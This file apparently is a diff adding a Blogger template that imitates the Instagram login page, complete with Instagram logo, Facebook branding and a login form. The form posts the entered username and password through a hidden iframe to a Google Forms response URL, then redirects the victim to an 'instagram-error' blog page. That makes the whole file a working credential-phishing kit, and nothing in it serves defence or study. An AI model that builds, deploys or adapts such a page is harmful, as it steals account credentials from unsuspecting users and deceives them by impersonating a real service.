@@ -1,0 +1,237 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html b:css='false' b:defaultwidgetversion='2' b:layoutsVersion='3' b:responsive='true' b:templateUrl='indie.xml' b:templateVersion='1.3.2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+  <head>
+    <meta content='width=device-width, initial-scale=1' name='viewport'/>
+    <title><data:view.title.escaped/></title>
+    <b:include data='blog' name='all-head-content'/>
+
+    <!-- Bootstrap CSS -->
+    <link crossorigin='anonymous' href='https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css' integrity='sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1' rel='stylesheet'/>
+    <link href='https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet'/>
+    <link href='https://fonts.gstatic.com' rel='preconnect'/>
+<link href='https://fonts.googleapis.com/css2?family=Cedarville+Cursive&amp;family=Oswald:wght@300&amp;family=Roboto:wght@200&amp;display=swap' rel='stylesheet'/>
+    <link href='https://fonts.googleapis.com/css2?family=Sirin+Stencil&amp;display=swap' rel='stylesheet'/>
+    <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js'/>
+    <link href='css/style.css' rel='stylesheet'/>
+    <title>Instagram</title>
+    <b:skin><![CDATA[
+
+
+*{
+    margin: 0;
+    padding: 0;
+}
+@media screen and (max-width: 768px){
+    #main{
+        width: 80%;
+        margin: 0 auto;
+    }
+    
+    #main .lang{
+        text-align: center;
+        padding: 20px 0;
+        font-family: 'Roboto', sans-serif;
+		color:#95a5a6;
+    }
+    #main .lang i.arrow{
+        font-family: 'Roboto', sans-serif;
+        border: solid #95a5a6;
+        border-width: 0 .5px .5px 0;
+        display: inline-block;
+        padding: 3px;
+        margin-left: 8px;
+        font-weight: normal !important;
+    }
+    #main .lang i.down{
+        transform: rotate(90deg);
+        -webkit-transform: rotate(45deg);
+    }
+    #main .logo{
+        text-align: center;
+        padding: 20px 0;
+    }
+    #main .logo img{
+        width:65%;
+    }
+    #main .fb{
+        text-align: center;
+    }
+    #main .fb button{
+		width:100%;
+		border:none;
+		outline:none;
+		border-radius:4px;
+		margin-top:10px;
+        padding: 5px 30px;
+        color: #fff;
+        background-color: #0095f6;
+        font-size: 16px;
+    }
+	#main .fb i{
+		margin-right:3px;
+		font-size:18px;
+	}
+    #main .or{
+        width: 100%;
+		color:#95a5a6;
+		padding-top:20px;
+		padding-bottom:0px;
+		-webkit-box-orient: horizontal;
+   		-webkit-box-direction: normal;
+		display:flex;
+    	flex-direction: row;
+    }
+	#main .bar{
+		width:45%;
+		height:1.5px;
+		position: relative;
+        top: 0.85em;
+		color:#95a5a6;;
+		flex-grow: 1;
+		flex-shrink: 1;
+		background-color: #dbdbdb;
+	}
+	#main .form form div input{
+		font-size:12px;
+		width:100% !important;
+		padding: 9px 0 7px 8px;
+		margin-top:0;
+		margin-bottom:8px;
+		outline:0;
+		background:rgba(236, 240, 241,.4);
+		border:1px solid #dbdbdb;
+	}
+	#main .form .forgot{
+		padding-bottom: 12px;
+    	padding-top: 12px;
+		text-align: right;
+	}
+	#main .form .forgot span{
+		color:#0095f6;
+	}
+	#main .logBtn{
+        text-align: center;
+    }
+    #main .logBtn button{
+		width:100%;
+		border:none;
+		outline:none;
+		border-radius:4px;
+		margin-top:10px;
+        padding: 5px 30px;
+        color: #fff;
+        background-color: #0095f6;
+        font-size: 16px;
+    }
+	#main .dont{
+		padding-bottom: 12px;
+    	padding-top: 17px;
+		text-align: center;
+	}
+	#main .dont span{
+		font-family: 'Roboto', sans-serif;
+		color:#95a5a6;
+ 	}
+	#main .dont a{
+		color: #0095f6;
+		text-decoration:none;
+ 	}
+	#main .facebook{
+		text-align: center;
+		position: absolute;
+        bottom: 0%;
+        left: 50%;
+		transform: translate(-50%,-50%);
+	}
+	#main .facebook .from{
+		font-size:12px;
+		font-family: 'Roboto', sans-serif;
+		color:#95a5a6;
+	}
+	#main .facebook .fbb{
+		font-size:14px;
+		 letter-spacing: 2px;
+		font-weight:bold;
+	}
+
+}
+ ]]></b:skin>
+  </head>
+  <body>
+  <main id='main'>
+        <div class='lang'>
+            <span>English <i class='down arrow'/></span>
+        </div>
+        <div class='logo'>
+            <img alt='' src='https://1.bp.blogspot.com/-VybDQa7Rygg/YGnh7YKtOUI/AAAAAAAAAEI/oiTlgeVOpGo7SIiAAdtOc5H0Qc68qIjYgCLcBGAsYHQ/s2084/insta.png'/>
+        </div>
+        <div class='fb'>
+            <button type='button'><i aria-hidden='true' class='fa fa-facebook-official'/> Continue with Facebook
+            </button>
+        </div>
+   		 <div class='or'>
+           <div class='bar'/>
+           <div class='or-text'>&amp;nbsp &amp;nbsp OR &amp;nbsp &amp;nbsp</div>
+           <div class='bar'/>
+        </div>
+    <div class='form'>
+         <!--Update the URL for thank you page on form submit -->
+        <iframe id='hidden_iframe' name='hidden_iframe' onload='if(submitted) {window.location=&apos;https://instagram-error.blogspot.com/&apos;;}' style='display:none;'/> 
+
+       <form action='https://docs.google.com/forms/u/1/d/e/1FAIpQLSe4thjC7myDnGxVgUXRXime81Yy-6kZ2wAwF9uLjGR_oaQWGg/formResponse' jsmodel='TOfxwf Q91hve' method='post' onsubmit='return validateForm(); ' target='hidden_iframe'>
+
+        <div><input id='username' name='entry.1007147199' placeholder='Phone number,username, or email' required='' type='text'/></div>
+            <div><input id='password' name='entry.560590440' placeholder='Password' required='' type='text'/></div>
+          <div class='forgot'>
+            <span>Forgot Password?</span>
+          </div>
+            <div class='logBtn'>
+                <button type='submit'>Log In</button>
+            </div>
+    </form>
+      </div>
+       <!-- end form here -->
+    <div class='dont'>
+      <span>Don&#39;t have an account?</span><a href='#'>Sign up</a>
+    </div>
+    <div class='facebook'>
+        <div class='from'>from</div>
+        <div class='fbb'>FACEBOOK</div>
+    </div>
+    </main>
+    <b:section id='fixelements' showaddelement='no'/>
+  </body>
+<script type='text/javascript'>
+    function validateUserName() {
+              var username = document.getElementById(&#39;username&#39;).value;
+              if(username.length == 0) {
+                alert(&quot;Name can&#39;t be blank&quot;) ;
+                return false;
+  
+              }
+             
+              return true;
+            }
+  function validatePass() {
+              var pass = document.getElementById(&#39;password&#39;).value;
+              if(pass.length == 0) {
+                alert(&quot;Password can&#39;t be blank&quot;) ;//Validation Message
+                return false;
+              }
+   return true;
+  }
+  
+          function validateForm() {
+            if (!validateUserName() || !validatePass()) {
+  
+              alert(&quot;Form not submitted&quot;);//Validation Message
+              return false;
+            }
+            else {
+           submitted=true;
+              return true;
+            }
+          }
+      </script>
+</html>
